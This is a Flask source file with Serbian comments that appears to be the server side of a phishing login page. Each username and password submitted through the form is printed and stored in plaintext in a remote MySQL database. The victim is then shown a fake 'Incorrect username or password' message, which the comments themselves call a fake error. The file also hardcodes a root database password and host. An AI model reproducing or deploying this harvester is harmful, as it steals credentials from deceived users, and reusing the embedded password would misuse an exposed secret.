import os
from flask import Flask, render_template, request, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import pymysql

# ✅ Flask aplikacija
app = Flask(__name__)

# ✅ Railway MySQL povezivanje
DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway')
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.urandom(24)

# ✅ Inicijalizacija baze
db = SQLAlchemy(app)

# ✅ Model za čuvanje unetih login podataka
class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)

    def __repr__(self):
        return f'<LoginAttempt {self.username}>'

# ✅ Kreiranje tabela ako ne postoje
with app.app_context():
    try:
        db.create_all()
        print("✅ Baza podataka je povezana i tabele su kreirane!")
    except Exception as e:
        print(f"❌ GREŠKA pri povezivanju na bazu: {e}")

# ✅ Prikaz početne strane
@app.route('/')
def index():
    return render_template('index.html', message=None)

# ✅ Obrada unosa iz login forme
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    print(f"📥 Prijava: {username} | Lozinka: {password}")

    if not username or not password:
        flash("Sva polja su obavezna!", "danger")
        return redirect(url_for('index'))

    # ✅ Čuvanje unetih podataka u bazu
    try:
        new_attempt = LoginAttempt(username=username, password=password)
        db.session.add(new_attempt)
        db.session.commit()
        print(f"✅ Podaci sačuvani: {username}")
    except Exception as e:
        db.session.rollback()
        print(f"❌ GREŠKA pri upisu u bazu: {e}")

    # ✅ Prikazivanje lažne greške korisniku
    return render_template('index.html', message="Incorrect username or password.")

# ✅ Pokretanje aplikacije
if __name__ == '__main__':
    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])
    app.run(host="0.0.0.0", port=10000, debug=True)
